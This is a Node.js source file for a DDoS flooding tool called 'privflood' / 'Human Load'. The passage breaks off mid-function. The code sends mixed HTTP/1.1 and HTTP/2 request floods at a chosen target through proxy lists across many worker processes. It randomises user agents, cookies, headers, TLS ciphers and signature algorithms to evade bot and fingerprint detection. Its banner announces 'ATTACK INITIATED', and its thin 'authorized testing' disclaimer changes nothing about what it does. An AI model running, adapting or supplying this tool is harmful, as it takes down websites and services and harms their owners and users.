const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');
const { performance } = require('perf_hooks');

// Enhanced ignore lists with more error codes and patterns
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning', 'FetchError', 'SocketError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123', 'ERR_TLS_CERT_ALTNAME_INVALID', 'ERR_SSL_WRONG_VERSION_NUMBER', 'HPE_INVALID_METHOD', 'HPE_INVALID_URL'];

// Streamlined versions with expanded browser/OS diversity - No longer directly used for UA generation
const versions = {
    Chrome: ['120.0.0.0', '119.0.0.0', '118.0.0.0'],
    Safari: ['17.4', '17.3', '17.2'],
    Firefox: ['125.0', '124.0', '123.0'],
    Edge: ['120.0.0.0', '119.0.0.0', '118.0.0.0']
};

// **IMPORTED USER AGENTS FOR BETTER PERFORMANCE**
const UAs = [
  // iPhone User Agents (from search results and filtered original list)
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/135.0.7049.50 Version/16.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/136.2 Mobile/15E148 Safari/605.1.15",
  "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
  "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5",
  "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_2_1 like Mac OS X; he-il) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
  "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5",
  "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5",
  "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1",
  "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)", //
  "Mozilla/5.0 (iPad; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1",
  "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3",
  "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:139.0) Gecko/20100101 Firefox/139.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
  "Mozilla/5.0 (PlayStation 5; CPU iPhone OS 11_40 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.40 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (PlayStation 5; CPU iPhone OS 11_20 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.20 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Edge/102.0.1245.44",
  "Mozilla/5.0 (Xbox; Gaming; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Edge/103.0.1264.37",
  "Mozilla/5.0 (Xbox; Gaming; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Edge/105.0.1296.0",
  "Mozilla/5.0 (Xbox; Gaming; Xbox Series S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Edge/105.0.1296.0",
  "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A325F/A325FXXU2BVD6) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Multilaser_F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Nokia 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
  "Mozilla/5.0 (Linux; Android 10; Nokia 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.39",
  "Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.98 Safari/537.36 OPR/67.2.2132.112",
];

// Helper functions for generating various types of cookie values
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function generateRandomHex(length) {
    let result = '';
    const characters = '0123456789abcdef';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomAlphaNumeric(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateBase64(length) {
    const bytes = crypto.randomBytes(Math.ceil(length * 3 / 4));
    return bytes.toString('base64').substring(0, length);
}

// Advanced cookie generation logic
function generateAdvancedCookie() {
    const cookieTypes = [
        'session_id',
        'tracking_ga',
        'tracking_fb',
        'csrf_token',
        'preference',
        'generic_random'
    ];

    const type = cookieTypes[Math.floor(Math.random() * cookieTypes.length)];
    let name, value;

    switch (type) {
        case 'session_id':
            const sessionNames = ['JSESSIONID', 'PHPSESSID', 'ASPSESSIONID', 'sessionid', 'connect.sid', '_session_id', 'sess'];
            name = sessionNames[Math.floor(Math.random() * sessionNames.length)];
            if (Math.random() < 0.5) {
                value = generateRandomHex(30);
            } else {
                value = generateUUID();
            }
            break;
        case 'tracking_ga':
            name = `_ga`;
            value = `GA1.${Math.floor(Math.random() * 9) + 1}.${Math.floor(Math.random() * 9000000000) + 1000000000}.${Date.now() - Math.floor(Math.random() * 31536000000)}`;
            break;
        case 'tracking_fb':
            name = `_fbp`;
            value = `fb.1.${Date.now() - Math.floor(Math.random() * 31536000000)}.${Math.floor(Math.random() * 900000000000) + 100000000000}`;
            break;
        case 'csrf_token':
            const csrfNames = ['csrftoken', 'XSRF-TOKEN', '__Host-csrf', '__Secure-csrf'];
            name = csrfNames[Math.floor(Math.random() * csrfNames.length)];
            value = generateBase64(24);
            break;
        case 'preference':
            const prefNames = ['pref', 'theme', 'lang', 'currency', 'timezone', 'country'];
            name = prefNames[Math.floor(Math.random() * prefNames.length)];
            const prefValues = {
                'theme': ['dark', 'light', 'system'],
                'lang': ['en', 'fa', 'ar', 'de', 'fr'],
                'currency': ['USD', 'EUR', 'GBP', 'IRR'],
                'timezone': ['America/New_York', 'Europe/Berlin', 'Asia/Tehran', 'UTC'],
                'country': ['US', 'DE', 'IR', 'GB', 'FR']
            };
            value = prefValues[name] ? prefValues[name][Math.floor(Math.random() * prefValues[name].length)] : generateRandomAlphaNumeric(8);
            break;
        case 'generic_random':
        default:
            const genericNames = ['id', 'token', 'data', 'key', 'user_id', 'client_id', 'visitor_id'];
            name = genericNames[Math.floor(Math.random() * genericNames.length)];
            value = generateRandomAlphaNumeric(15);
            break;
    }
    return `${name}=${value}`;
}

const referrers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://t.co/',
    'https://facebook.com/',
    'https://linkedin.com/',
    'https://www.reddit.com/',
    'https://duckduckgo.com/',
    'https://stackoverflow.com/',
    'https://github.com/',
    'https://medium.com/',
];

const dntOptions = ['1', '0'];
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8', // Common for image/resource requests
    'application/json, text/javascript, */*; q=0.01' // Common for AJAX requests
];
const acceptLanguageHeaders = [
    'en-US,en;q=0.9,fa;q=0.8',
    'en-US,en;q=0.9',
    'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7'
];
const acceptEncodingHeaders = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip',
    'deflate',
    'br'
];

// User-Agent generation now simply picks from the imported UAs array
function getRandomUserAgent() {
    return UAs[Math.floor(Math.random() * UAs.length)];
}

// More dynamic query parameter generation
const generateRandomQueryString = () => {
    const numParams = Math.floor(Math.random() * 4) + 1; // 1 to 4 random parameters
    let queryString = '';
    for (let i = 0; i < numParams; i++) {
        const paramName = generateRandomAlphaNumeric(Math.floor(Math.random() * 6) + 2); // 2-7 chars
        const paramValue = generateRandomAlphaNumeric(Math.floor(Math.random() * 12) + 4); // 4-15 chars
        queryString += `${i === 0 ? '' : '&'}${paramName}=${paramValue}`;
    }
    return queryString;
};

// TLS fingerprinting evasion: Randomize order of sigalgs and ecdhCurve
const getRandomizedSigAlgs = () => [
    'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512', 'ed25519', 'ed448'
].sort(() => Math.random() - 0.5).join(':');

const getRandomizedEcdhCurves = () => [
    'prime256v1', 'secp384r1', 'secp521r1', 'X25519', 'X448'
].sort(() => Math.random() - 0.5).join(':');

// Jitter factor for more human-like timing
const JITTER_FACTOR = 0.2; // 20% random variation in delay

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv.length < 6) {
    console.clear();
    console.log(colors.red(`
             ██╗░░██╗██╗░░░██╗███╗░░░███╗░█████╗░███╗░░██╗   ██╗░░░░░░█████╗░░█████╗░██████╗░
             ██║░░██║██║░░░██║████╗░████║██╔══██╗████╗░██║   ██║░░░░░██╔══██╗██╔══██╗██╔══██╗
             ███████║██║░░░██║██╔████╔██║███████║██╔██╗██║   ██║░░░░░██║░░██║███████║██║░░██║
             ██╔══██║██║░░░██║██║╚██╔╝██║██╔══██║██║╚████║   ██║░░░░░██║░░██║██╔══██║██║░░██║
             ██║░░██║╚██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║   ███████╗╚█████╔╝██║░░██║██████╔╝
             ╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝   ╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝
`));
    console.log(colors.red(`    contact: Privflood@gmail.com`));
    console.log(colors.red(`    ${colors.white('Script Notes:')} Human Load: Overwhelm targets with a massive human-grade traffic storm.`));
    console.log(colors.red(`\n    [!] ATTENTION: Use this tool responsibly. The developer is not accountable for any misuse or illegal activities.`));
    console.log(colors.red(`    [!] This is for authorized penetration testing and research purposes only.`));
    console.log(colors.red(`\n    ${colors.white('Usage:')} node privflood.js <target> <duration> <proxies.txt> <threads> <rate> [--h2-streams <count>] [-h (headfull)]`));
    console.log(colors.red(`    ${colors.white('Example:')} node privflood.js https://target.com 120 proxies.txt 100 64 --h2-streams 50 -h`));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
let threads = parseInt(process.argv[5]);
let rate = parseInt(process.argv[6]);

const args = process.argv.slice(2);
const options = {
    headfull: args.includes('-h'),
    h2ConcurrentStreams: args.includes('--h2-streams') ? parseInt(args[args.indexOf('--h2-streams') + 1]) : 50
};

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    console.log(colors.red('[ERROR] Failed to load proxy file! Ensure it exists and is accessible.'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    try {
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    } catch (e) {
        return Buffer.alloc(0);
    }
}

function decodeFrame(data) {
    try {
        if (!data || data.length < 9) return null;

        const lengthAndType = data.readUInt32BE(0)
        const length = lengthAndType >> 8
        const type = lengthAndType & 0xFF
        const flags = data.readUint8(4)
        const streamId = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0

        let payload = Buffer.alloc(0)

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)
            if (payload.length + offset != length) {
                return null
            }
        }
        return { streamId, length, type, flags, payload }
    } catch (e) {
        return null;
    }
}

function encodeSettings(settings) {
    try {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    } catch (e) {
        return Buffer.alloc(0);
    }
}

function encodeRstStream(streamId, type, flags) {
    try {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    } catch (e) {
        return Buffer.alloc(0);
    }
}

// **ALWAYS GENERATE ALL HEADERS**
function generateDynamicHeaders(currentHost) {
    const headers = {};
    
    // Referer - always include
    const allReferrers = [...referrers];
    if (currentHost) {
        allReferrers.push(`https://${currentHost}/`);
    }
    headers['Referer'] = allReferrers[Math.floor(Math.random() * allReferrers.length)];
    
    // DNT - always include
    headers['DNT'] = dntOptions[Math.floor(Math.random() * dntOptions.length)];
    
    // Accept - always include
    headers['Accept'] = acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
    
    // Accept-Language - always include
    headers['Accept-Language'] = acceptLanguageHeaders[Math.floor(Math.random() * acceptLanguageHeaders.length)];
    
    // Accept-Encoding - always include
    headers['Accept-Encoding'] = acceptEncodingHeaders[Math.floor(Math.random() * acceptEncodingHeaders.length)];

    // Add other common human-like headers always
    headers['Pragma'] = 'no-cache';
    headers['Cache-Control'] = Math.random() < 0.5 ? 'max-age=0' : 'no-cache';
    headers['Upgrade-Insecure-Requests'] = '1'; // Modern browsers often send this

    // Random If-Modified-Since or If-None-Match - always include one
    if (Math.random() < 0.5) {
        const pastDate = new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000); // Up to 30 days ago
        headers['If-Modified-Since'] = pastDate.toUTCString();
    } else {
        headers['If-None-Match'] = `"${generateRandomHex(20)}"`;
    }

    // X-Requested-With for AJAX simulation - often include
    if (Math.random() < 0.7) { 
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }

    // Add Sec-CH-UA headers randomly for modern browser simulation
    // Since UAs are now static strings, we simulate common Sec-CH-UA values
    // for Chrome-like browsers for better stealth.
    if (Math.random() < 0.8) { // High probability to include these
        const majorVersion = Math.floor(Math.random() * (120 - 100 + 1)) + 100; // Simulate recent Chrome major versions
        headers['sec-ch-ua'] = `"Google Chrome";v="${majorVersion}", "Chromium";v="${majorVersion}", "Not.A/Brand";v="8"`;
        headers['sec-ch-ua-mobile'] = Math.random() < 0.5 ? '?1' : '?0'; // Randomly mobile or desktop
        headers['sec-ch-ua-platform'] = `"${['Windows', 'macOS', 'Linux'][Math.floor(Math.random() * 3)]}"`;
        headers['sec-ch-ua-platform-version'] = `"${Math.floor(Math.random() * 10) + 1}.0.0"`; // Simulate platform versions
        headers['sec-ch-ua-arch'] = `"${Math.random() < 0.5 ? 'x86' : 'arm'}"`;
        headers['sec-ch-ua-wow64'] = Math.random() < 0.5 ? '?1' : '?0'; // Randomly include WOW64
    }
    
    if (Math.random() < 0.5) { // Randomly add device memory and DPR
        headers['device-memory'] = (Math.floor(Math.random() * 4) + 2).toString(); // 2, 4, 6GB
        headers['dpr'] = (Math.random() * (3.0 - 1.0) + 1.0).toFixed(1); // 1.0 to 3.0
        headers['viewport-width'] = (Math.floor(Math.random() * (1920 - 1024 + 1)) + 1024).toString();
        headers['viewport-height'] = (Math.floor(Math.random() * (1080 - 768 + 1)) + 768).toString();
    }
    if (Math.random() < 0.4) { // Randomly add network info
        const ect = ['4g', '3g', '2g', 'slow-2g'];
        headers['ect'] = ect[Math.floor(Math.random() * ect.length)];
        headers['rtt'] = (Math.floor(Math.random() * (150 - 50 + 1)) + 50).toString(); // 50-150ms
        headers['downlink'] = (Math.random() * (100.0 - 1.0) + 1.0).toFixed(1); // 1.0-100.0 Mbps
    }

    return headers;
}

function buildRequest(userAgent) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const dynamicHeaders = generateDynamicHeaders(url.hostname);

    let headers = `${method} ${url.pathname}${Math.random() > 0.3 ? '?' + generateRandomQueryString() : ''} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n`;

    for (const headerName in dynamicHeaders) {
        headers += `${headerName}: ${dynamicHeaders[headerName]}\r\n`;
    }
    headers += `User-Agent: ${userAgent}\r\n\r\n`;
    return Buffer.from(headers, 'binary');
}

let http1Payload;

if (cluster.isMaster) {
    console.clear();
    console.log(colors.red(`
             ██╗░░██╗██╗░░░██╗███╗░░░███╗░█████╗░███╗░░██╗   ██╗░░░░░░█████╗░░█████╗░██████╗░
             ██║░░██║██║░░░██║████╗░████║██╔══██╗████╗░██║   ██║░░░░░██╔══██╗██╔══██╗██╔══██╗
             ███████║██║░░░██║██╔████╔██║███████║██╔██╗██║   ██║░░░░░██║░░██║███████║██║░░██║
             ██╔══██║██║░░░██║██║╚██╔╝██║██╔══██║██║╚████║   ██║░░░░░██║░░██║██╔══██║██║░░██║
             ██║░░██║╚██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║   ███████╗╚█████╔╝██║░░██║██████╔╝
             ╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝   ╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝
`));
    console.log(colors.red(`    contact: Privflood@gmail.com`));
    console.log(colors.red(`    ${colors.white('Script Notes:')} Human Load: Overwhelm targets with a massive human-grade traffic storm.`));
    console.log(colors.red(`\n    [!] ATTENTION: Use this tool responsibly. The developer is not accountable for any misuse or illegal activities.`));
    console.log(colors.red(`    [!] This is for authorized penetration testing and research purposes only.`));
    console.log(colors.red(`    [!] By using this, you acknowledge and accept all risks and liabilities.`));
    console.log(colors.red(`\n    ${colors.white('Target:')} ${target}`));
    console.log(colors.red(`    ${colors.white('Duration:')} ${duration}s`));
    console.log(colors.red(`    ${colors.white('HTTP/2 Concurrent Streams:')} ${options.h2ConcurrentStreams}`));
    console.log(colors.red(`    ${colors.white('Headfull Mode:')} ${options.headfull ? 'Enabled' : 'Disabled'}`));
    console.log(colors.red(`    ${colors.white('Threads (CPU Cores):')} ${threads}`)); // Updated label
    console.log(colors.red(`    ${colors.white('Rate/Worker:')} ${rate}`)); // Updated label
    console.log(colors.red(`\n[!] ATTACK INITIATED... [!]`));

    let totalRequests = 0;
    let lastRequests = 0;
    let startTime = performance.now();

    setInterval(() => {
        const currentRequests = stats.requests;
        const rps = currentRequests - lastRequests;
        lastRequests = currentRequests;
        totalRequests += currentRequests;
        stats.requests = 0;
        setTitle(`Human Load | Total: ${totalRequests} | RPS: ${rps} | H2/H1 Mixed RushAway`);
    }, 1000);

    const workers = [];
    for(let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.requests += msg.requests;
                stats.goaway += msg.goaway;
                stats.success += msg.success;
                stats.forbidden += msg.forbidden;
                stats.errors += msg.errors;
            }
        });
    }

    setTimeout(() => {
        console.log(colors.red('\n[!] ATTACK COMPLETE, BOSS [!]'));
        workers.forEach(worker => worker.kill());
        process.exit(0);
    }, duration * 1000);
} else {
    // Each worker will have its own session ticket cache in RAM
    const sessionTickets = new Map(); // Stores TLS session tickets keyed by hostname.

    // **COMPREHENSIVE CIPHER SUITES**
    const ciphers = [
        "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_128_CBC_SHA256:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_CBC_SHA",
        "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
        ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
    ].join(':'); // Join all cipher lists with ':'

    function go() {
        const proxyEntry = proxy[~~(Math.random() * proxy.length)];
        if (!proxyEntry) {
            return;
        }
        const [proxyHost, proxyPort] = proxyEntry.split(':');
        let tlsSocket;
        if (!proxyPort || isNaN(proxyPort)) {
            return;
        }

        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                // Retrieve existing session ticket for this hostname to enable TLS session resumption.
                const session = sessionTickets.get(url.hostname);

                tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.hostname,
                    ciphers: ciphers, // Use our comprehensive cipher list.
                    sigalgs: getRandomizedSigAlgs(), // Randomize signature algorithms
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                                   crypto.constants.SSL_OP_NO_SSLv3 |
                                   crypto.constants.SSL_OP_NO_TLSv1 |
                                   crypto.constants.SSL_OP_NO_TLSv1_1 |
                                   crypto.constants.SSL_OP_NO_COMPRESSION,
                    secure: true,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false,
                    ecdhCurve: getRandomizedEcdhCurves(), // Randomize ECDH curves
                    session: session // Pass the session ticket here for resumption.
                }, () => {
                    // If a new session ticket is provided by the server, store it for future connections.
                    if (tlsSocket.getSession) {
                        const newSession = tlsSocket.getSession();
